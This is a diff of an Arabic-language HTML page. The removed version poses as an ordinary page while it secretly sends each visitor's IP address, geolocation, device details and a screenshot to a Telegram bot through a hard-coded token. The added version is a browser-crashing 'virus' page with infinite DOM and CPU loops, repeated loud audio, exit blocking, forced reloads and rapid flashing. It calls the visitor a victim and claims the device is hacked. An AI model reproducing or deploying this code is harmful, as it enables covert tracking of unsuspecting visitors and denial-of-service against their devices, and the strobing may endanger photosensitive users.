@@ -1,60 +1,63 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>صفحة مزيفة</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <title>هاه</title>
     <script>
-        async function sendToTelegram(data) {
-            const botToken = "8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU"; // استبدل ببوتك
-            const chatId = "5446862709"; // استبدل بآيدي الدردشة
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(data)}`;
-            await fetch(url);
+        // حلقة لا نهائية لإنشاء عناصر DOM وتحميل الذاكرة
+        function crashDevice() {
+            while (true) {
+                const element = document.createElement('div');
+                element.innerHTML = '💣 الجهاز سيتحطم خلال ثواني 💣';
+                document.body.appendChild(element);
+                
+                // تشغيل صوت مرتفع بشكل متكرر
+                const audio = new Audio('data:audio/wav;base64,UklGRl9vX19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU...');
+                audio.volume = 1.0;
+                audio.play();
+                
+                // استنزاف وحدة المعالجة
+                for (let i = 0; i < 1000000; i++) {
+                    Math.sqrt(i);
+                }
+            }
         }
 
-        function captureScreen() {
-            html2canvas(document.body).then(canvas => {
-                const screenshot = canvas.toDataURL('image/png');
-                sendToTelegram(`لقطة شاشة: ${screenshot}`);
-            });
-        }
-
-        function getDeviceInfo() {
-            const info = `
-                عنوان IP: ${window.ip || "غير معروف"}
-                الموقع: ${window.location.href}
-                User Agent: ${navigator.userAgent}
-                نظام التشغيل: ${navigator.platform}
-                الذاكرة: ${navigator.deviceMemory || "غير معروف"} GB
-                المعالج: ${navigator.hardwareConcurrency || "غير معروف"} نواة
-            `;
-            sendToTelegram(info);
-        }
-
-        // جلب الـ IP
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => {
-                window.ip = data.ip;
-                sendToTelegram(`عنوان IP الضحية: ${data.ip}`);
-            });
-
-        // جلب الموقع الجغرافي
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(position => {
-                const location = `خط الطول: ${position.coords.latitude}, خط العرض: ${position.coords.longitude}`;
-                sendToTelegram(`الموقع الجغرافي: ${location}`);
-            });
-        }
-
-        // جمع المعلومات وإرسالها
-        setTimeout(() => {
-            captureScreen();
-            getDeviceInfo();
-        }, 3000);
+        // تشغيل الوظيفة عند تحميل الصفحة
+        window.onload = function() {
+            // منع المستخدم من الخروج
+            window.onbeforeunload = function() {
+                return "لا يمكنك الخروج! 😈";
+            };
+            
+            // تشغيل الفيروس
+            setTimeout(crashDevice, 1000);
+            
+            // إعادة توجيه متكررة لمنع أي عمل
+            setInterval(() => {
+                window.location.href = window.location.href;
+            }, 500);
+        };
     </script>
+    <style>
+        body {
+            background-color: black;
+            color: red;
+            font-size: 50px;
+            text-align: center;
+            margin-top: 100px;
+            animation: blink 0.1s infinite;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+    </style>
 </head>
 <body>
-    <h1>مرحبًا! هذه صفحة عادية تمامًا 😊</h1>
-    <p>جاري التحميل...</p>
+    <h1>😈 لقد تم اختراق جهازك! 😈</h1>
+    <p>سيتم تدمير الجهاز خلال ثواني...</p>
 </body>
 </html>
+
+
